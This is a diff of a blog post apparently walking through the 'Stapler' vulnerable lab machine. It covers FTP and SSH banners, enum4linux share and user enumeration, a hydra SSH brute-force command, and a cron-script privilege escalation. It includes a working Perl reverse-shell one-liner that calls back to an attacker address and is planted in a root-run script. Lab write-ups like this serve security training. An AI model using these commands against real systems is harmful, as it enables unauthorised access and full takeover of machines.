@@ -90,14 +90,12 @@
 
 <p>Connecting to FTP we are presented a message:</p>
 
-<p><code class="highlighter-rouge">
-220-
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">220-
 220-|-----------------------------------------------------------------------------------------|
 220-| Harry, make sure to update the banner when you get a chance to show who has access here |
 220-|-----------------------------------------------------------------------------------------|
 220-
-220
-</code></p>
+220</code></pre></figure>
 
 <p><img src="/img/stapler/image.png" alt="img of ftp output" /></p>
 
@@ -118,10 +116,9 @@ Elly, make sure you update the payload information. Leave it in your FTP account
 
 <p>When using ssh to connect to the box, we see another message:</p>
 
-<h2 id="section">```</h2>
-<p>~ Barry, don’t forget to put a message here ~
-—————————————————————–
-```</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">-----------------------------------------------------------------
+~ Barry, don<span class="s1">'t forget to put a message here ~
+-----------------------------------------------------------------</span></code></pre></figure>
 
 <p>using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4</p>
 
@@ -129,79 +126,78 @@ Elly, make sure you update the payload information. Leave it in your FTP account
 
 <p>enum4linux reveals quite a bit of information for this server, including a list of valid users and 2 mount points.</p>
 
-<p>```
-# enum4linux 192.168.1.116
-Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 16 11:36:25 2017
-==========================
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># enum4linux 192.168.1.116</span>
+Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Sun Jul 16 11:36:25 2017
+<span class="o">==========================</span>
 | Target Information     |
-==========================
-Target ……….. 192.168.1.116
-RID Range …….. 500-550,1000-1050
-Username ……… ‘’
-Password ……… ‘’
-Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</p>
+<span class="o">==========================</span>
+Target ........... 192.168.1.116
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-<p>==========================================
+<span class="o">==========================================</span>
 | Share Enumeration on 192.168.1.116     |
-==========================================
-WARNING: The “syslog” option is deprecated
-Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]</p>
+<span class="o">==========================================</span>
+WARNING: The <span class="s2">"syslog"</span> option is deprecated
+<span class="nv">Domain</span><span class="o">=[</span>WORKGROUP] <span class="nv">OS</span><span class="o">=[</span>Windows 6.1] <span class="nv">Server</span><span class="o">=[</span>Samba 4.3.9-Ubuntu]
 
-<p>Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+<span class="nv">Domain</span><span class="o">=[</span>WORKGROUP] <span class="nv">OS</span><span class="o">=[</span>Windows 6.1] <span class="nv">Server</span><span class="o">=[</span>Samba 4.3.9-Ubuntu]
 Sharename Type Comment
-——— —- ——-
-print$    Disk  Printer Drivers
+--------- ---- -------
+<span class="gp">print$    </span>Disk  Printer Drivers
 kathy     Disk  Fred, What are we doing here?
 tmp       Disk  All temporary files should be stored here
-IPC$      IPC   IPC Service (red server (Samba, Ubuntu))</p>
+<span class="gp">IPC$      </span>IPC   IPC Service <span class="o">(</span>red server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
 
-<p>Server    Comment
-——— ——-
+
+Server    Comment
+--------- -------
 LINKSYS01751 Samba 3.0.28a
-RED        red server (Samba, Ubuntu)</p>
+RED        red server <span class="o">(</span>Samba, Ubuntu<span class="o">)</span>
 
-<p>Workgroup  Master
-———  ——–
-WORKGROUP LINKSYS01751</p>
+Workgroup  Master
+---------  --------
+WORKGROUP LINKSYS01751
 
-<p>[+] Attempting to map shares on 192.168.1.116
-//192.168.1.116/print$ Mapping: DENIED, Listing: N/A
+<span class="o">[</span>+] Attempting to map shares on 192.168.1.116
+<span class="gp">//192.168.1.116/print$ </span>Mapping: DENIED, Listing: N/A
 //192.168.1.116/kathy Mapping: OK, Listing: OK
 //192.168.1.116/tmp Mapping: OK, Listing: OK
-//192.168.1.116/IPC$ Mapping: OK Listing: DENIED</p>
+<span class="gp">//192.168.1.116/IPC$ </span>Mapping: OK Listing: DENIED
 
-<p>…</p>
+...
 
-<p>S-1-22-1-1000 Unix User\peter (Local User)
-S-1-22-1-1001 Unix User\RNunemaker (Local User)
-S-1-22-1-1002 Unix User\ETollefson (Local User)
-S-1-22-1-1003 Unix User\DSwanger (Local User)
-S-1-22-1-1004 Unix User\AParnell (Local User)
-S-1-22-1-1005 Unix User\SHayslett (Local User)
-S-1-22-1-1006 Unix User\MBassin (Local User)
-S-1-22-1-1007 Unix User\JBare (Local User)
-S-1-22-1-1008 Unix User\LSolum (Local User)
-S-1-22-1-1009 Unix User\IChadwick (Local User)
-S-1-22-1-1010 Unix User\MFrei (Local User)
-S-1-22-1-1011 Unix User\SStroud (Local User)
-S-1-22-1-1012 Unix User\CCeaser (Local User)
-S-1-22-1-1013 Unix User\JKanode (Local User)
-S-1-22-1-1014 Unix User\CJoo (Local User)
-S-1-22-1-1015 Unix User\Eeth (Local User)
-S-1-22-1-1016 Unix User\LSolum2 (Local User)
-S-1-22-1-1017 Unix User\JLipps (Local User)
-S-1-22-1-1018 Unix User\jamie (Local User)
-S-1-22-1-1019 Unix User\Sam (Local User)
-S-1-22-1-1020 Unix User\Drew (Local User)
-S-1-22-1-1022 Unix User\SHAY (Local User)
-S-1-22-1-1023 Unix User\Taylor (Local User)
-S-1-22-1-1024 Unix User\mel (Local User)
-S-1-22-1-1025 Unix User\kai (Local User)
-S-1-22-1-1026 Unix User\zoe (Local User)
-S-1-22-1-1027 Unix User\NATHAN (Local User)
-S-1-22-1-1028 Unix User\www (Local User)
-S-1-22-1-1029 Unix User\elly (Local User)
-```</p>
+S-1-22-1-1000 Unix User<span class="se">\p</span>eter <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1001 Unix User<span class="se">\R</span>Nunemaker <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1002 Unix User<span class="se">\E</span>Tollefson <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1003 Unix User<span class="se">\D</span>Swanger <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1004 Unix User<span class="se">\A</span>Parnell <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1005 Unix User<span class="se">\S</span>Hayslett <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1006 Unix User<span class="se">\M</span>Bassin <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1007 Unix User<span class="se">\J</span>Bare <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1008 Unix User<span class="se">\L</span>Solum <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1009 Unix User<span class="se">\I</span>Chadwick <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1010 Unix User<span class="se">\M</span>Frei <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1011 Unix User<span class="se">\S</span>Stroud <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1012 Unix User<span class="se">\C</span>Ceaser <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1013 Unix User<span class="se">\J</span>Kanode <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1014 Unix User<span class="se">\C</span>Joo <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1015 Unix User<span class="se">\E</span>eth <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1016 Unix User<span class="se">\L</span>Solum2 <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1017 Unix User<span class="se">\J</span>Lipps <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1018 Unix User<span class="se">\j</span>amie <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1019 Unix User<span class="se">\S</span>am <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1020 Unix User<span class="se">\D</span>rew <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1022 Unix User<span class="se">\S</span>HAY <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1023 Unix User<span class="se">\T</span>aylor <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1024 Unix User<span class="se">\m</span>el <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1025 Unix User<span class="se">\k</span>ai <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1026 Unix User<span class="se">\z</span>oe <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1027 Unix User<span class="se">\N</span>ATHAN <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1028 Unix User<span class="se">\w</span>ww <span class="o">(</span>Local User<span class="o">)</span>
+S-1-22-1-1029 Unix User<span class="se">\e</span>lly <span class="o">(</span>Local User<span class="o">)</span></code></pre></figure>
 
 <p><strong>Port 666:</strong></p>
 
@@ -264,7 +260,9 @@ This contains an interesting file message2.jpg.</p>
 
 <h2 id="bruteforce">Bruteforce</h2>
 
-<p><code class="highlighter-rouge">hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh</code></p>
+<div class="highlighter-rouge"><pre class="highlight"><code>hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh
+</code></pre>
+</div>
 
 <p><img src="/img/stapler/image14.png" alt="Bruteforce" /></p>
 
@@ -278,14 +276,18 @@ Using the password (cookie) from above I was able to ssh to the machine.</p>
 
 <p>I then started with the enumeration steps on the box itself. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
 
-<p><code class="highlighter-rouge">ls -lart /etc/cron.d/*</code></p>
+<div class="highlighter-rouge"><pre class="highlight"><code>ls -lart /etc/cron.d/*
+</code></pre>
+</div>
 
 <p>logrotate looked interesting as it calls to a script using the root user.
 <img src="/img/stapler/image16.png" alt="logrotate" /></p>
 
-<p><code class="highlighter-rouge">ls -l /usr/local/sbin/cron-logrotate.sh</code></p>
+<div class="highlighter-rouge"><pre class="highlight"><code>ls -l /usr/local/sbin/cron-logrotate.sh
 
-<p><code class="highlighter-rouge">cat /usr/local/sbin/cron-logrotate.sh</code></p>
+cat /usr/local/sbin/cron-logrotate.sh
+</code></pre>
+</div>
 
 <p><img src="/img/stapler/image17.png" alt="logrotate" /></p>
 
@@ -293,7 +295,9 @@ Using the password (cookie) from above I was able to ssh to the machine.</p>
 
 <p>I added a reverse shell using perl to this script:</p>
 
-<p><code class="highlighter-rouge">perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></p>
+<div class="highlighter-rouge"><pre class="highlight"><code>perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre>
+</div>
 
 <p><img src="/img/stapler/image18.png" alt="reverse shell in script" /></p>
 
